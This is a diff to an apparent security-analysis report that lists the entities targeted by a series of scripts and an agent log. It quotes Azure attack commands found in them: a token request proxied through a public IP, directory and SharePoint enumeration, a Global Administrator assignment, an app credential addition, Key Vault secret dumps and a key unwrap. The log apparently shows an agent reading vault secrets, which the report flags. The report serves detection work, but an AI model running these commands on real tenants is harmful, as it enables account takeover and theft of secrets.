@@ -146,7 +146,7 @@ Notable files   (a finding of high severity)
   [x] output  agent_20261015_093500.jsonl
       found   AppRoleAssignment, KeyVaultSecretRead, watchlist STORM-0940
 
-Targeted   (hardcoded in a script; prior: no earlier output holds it; discovered: an earlier output does)
+Targeted   (hardcoded values: prior means no earlier output holds it, discovered means one does; subjects: each entity an activity acted on)
   Usernames (1)
     [!] 66666666-7777-4888-9999-000000000000  prior  20261015_090000_step01_token.sh:8
         what  az login --service-principal -u "$APP" -p "$SECRET" --tenant "$TENANT" (20261015_090000_step01_token.sh:8)
@@ -173,6 +173,59 @@ Targeted   (hardcoded in a script; prior: no earlier output holds it; discovered
   IP addresses (1)
     [!] 144.172.64.128  public  prior  20261015_090000_step01_token.sh:5
         what  curl -s -x http://144.172.64.128:8080 -d "client_id=$APP" -d "scope=https://graph.microsoft.com/.default" \ (20261015_090000_step01_token.sh:5)
+  Tenant (1)
+    [x] 11111111-2222-4333-8444-555555555555 ($TENANT)  TokenRequest
+        what  TokenRequest: curl -s -x http://144.172.64.128:8080 -d "client_id=$APP" -d "scope=https://graph.microsoft.com/.default" -d "grant_type=client_credentials" -d "client_secret=$SECRET" "https://login.microsoftonlin... (20261015_090000_step01_token.sh:5)
+              TokenRequest: az login --service-principal -u "$APP" -p "$SECRET" --tenant "$TENANT" (20261015_090000_step01_token.sh:8)
+  Client (1)
+    [x] 66666666-7777-4888-9999-000000000000 ($APP)  TokenRequest
+        what  TokenRequest: curl -s -x http://144.172.64.128:8080 -d "client_id=$APP" -d "scope=https://graph.microsoft.com/.default" -d "grant_type=client_credentials" -d "client_secret=$SECRET" "https://login.microsoftonlin... (20261015_090000_step01_token.sh:5)
+              TokenRequest: az login --service-principal -u "$APP" -p "$SECRET" --tenant "$TENANT" (20261015_090000_step01_token.sh:8)
+  Resource (5)
+    [i] /users              GraphDirectoryEnumeration
+        what  GraphDirectoryEnumeration: Invoke-RestMethod -Headers $h -Uri "https://graph.microsoft.com/v1.0/users?`$top=999" | ConvertTo-Json | Out-File directory_20261015_090530.txt (20261015_090500_step02_recon.ps1:2)
+    [i] /servicePrincipals  GraphDirectoryEnumeration
+        what  GraphDirectoryEnumeration: Invoke-RestMethod -Headers $h -Uri "https://graph.microsoft.com/v1.0/servicePrincipals?`$top=999" (20261015_090500_step02_recon.ps1:3)
+    [i] /directoryRoles     GraphDirectoryEnumeration
+        what  GraphDirectoryEnumeration: Invoke-RestMethod -Headers $h -Uri "https://graph.microsoft.com/v1.0/directoryRoles" (20261015_090500_step02_recon.ps1:4)
+    [!] /sites              SharePointEnumeration
+        what  SharePointEnumeration: sites = requests.get("https://graph.microsoft.com/v1.0/sites?search=*", headers=headers) (20261015_092000_step04_collect.py:10)
+    [!] /sites/root/drives  SharePointEnumeration
+        what  SharePointEnumeration: drive = requests.get("https://graph.microsoft.com/v1.0/sites/root/drives", headers=headers) (20261015_092000_step04_collect.py:11)
+  Command (2)
+    [i] Get-MgApplication  GraphDirectoryEnumeration
+        what  GraphDirectoryEnumeration: Get-MgApplication -All (20261015_090500_step02_recon.ps1:5)
+    [i] az keyvault list   AzureResourceEnumeration
+        what  AzureResourceEnumeration: az keyvault list --query "[].name" -o tsv > vaults_20261015_093010.txt (20261015_093000_step05_vault.sh:2)
+  Role (1)
+    [x] roleTemplateId=62e90394-69f5-4237-9190-012177145e10  GlobalAdministratorAssignment
+        what  GlobalAdministratorAssignment: Invoke-RestMethod -Method Post -Headers $h -Uri "https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members/`$ref" -Body $member (20261015_091000_step03_escalate.ps1:4)
+  Principal (2)
+    [x] 9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d ($sp)  AppRoleAssignment
+        what  AppRoleAssignment: Invoke-RestMethod -Method Post -Headers $h -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$sp/appRoleAssignments" -Body $grant (20261015_091000_step03_escalate.ps1:5)
+    [x] 9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d        AppRoleAssignment
+        what  AppRoleAssignment: POST https://graph.microsoft.com/v1.0/servicePrincipals/9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d/appRoleAssignments (agent_20261015_093500.jsonl)
+  Application (1)
+    [x] 66666666-7777-4888-9999-000000000000  AppCredentialAddition
+        what  AppCredentialAddition: Invoke-RestMethod -Method Post -Headers $h -Uri "https://graph.microsoft.com/v1.0/applications/66666666-7777-4888-9999-000000000000/addPassword" -Body '{}' (20261015_091000_step03_escalate.ps1:3)
+  Vault (3)
+    [x] $v         KeyVaultSecretRead, KeyVaultKeyEnumeration
+        what  KeyVaultSecretRead: az keyvault secret list --vault-name "$v" -o tsv >> secrets_20261015_093030.txt (20261015_093000_step05_vault.sh:4)
+              KeyVaultKeyEnumeration: az keyvault key list --vault-name "$v" -o tsv (20261015_093000_step05_vault.sh:5)
+    [x] corpvault  KeyVaultSecretRead, KeyVaultKeyUnwrap
+        what  KeyVaultSecretRead: curl -s -H "Authorization: Bearer $KV" "https://corpvault.vault.azure.net/secrets/db-password?api-version=7.4" >> secrets_20261015_093030.txt (20261015_093000_step05_vault.sh:7)
+              KeyVaultKeyUnwrap: curl -s -X POST -H "Authorization: Bearer $KV" -d @wrapped.json "https://corpvault.vault.azure.net/keys/kek/0a1b2c3d/unwrapkey?api-version=7.4" (20261015_093000_step05_vault.sh:8)
+    [x] finvault   KeyVaultSecretRead, KeyVaultKeyEnumeration
+        what  KeyVaultSecretRead: az keyvault secret show --vault-name finvault --name api-key (agent_20261015_093500.jsonl)
+              KeyVaultKeyEnumeration: GET https://finvault.vault.azure.net/keys?api-version=7.4 (agent_20261015_093500.jsonl)
+  Secret (2)
+    [x] db-password  KeyVaultSecretRead
+        what  KeyVaultSecretRead: curl -s -H "Authorization: Bearer $KV" "https://corpvault.vault.azure.net/secrets/db-password?api-version=7.4" >> secrets_20261015_093030.txt (20261015_093000_step05_vault.sh:7)
+    [x] api-key      KeyVaultSecretRead
+        what  KeyVaultSecretRead: az keyvault secret show --vault-name finvault --name api-key (agent_20261015_093500.jsonl)
+  Key (1)
+    [x] kek  KeyVaultKeyUnwrap
+        what  KeyVaultKeyUnwrap: curl -s -X POST -H "Authorization: Bearer $KV" -d @wrapped.json "https://corpvault.vault.azure.net/keys/kek/0a1b2c3d/unwrapkey?api-version=7.4" (20261015_093000_step05_vault.sh:8)
 
 Exposure   (collected: first seen in an output; used: first seen in a script; a secret is masked)
   Usernames (3)
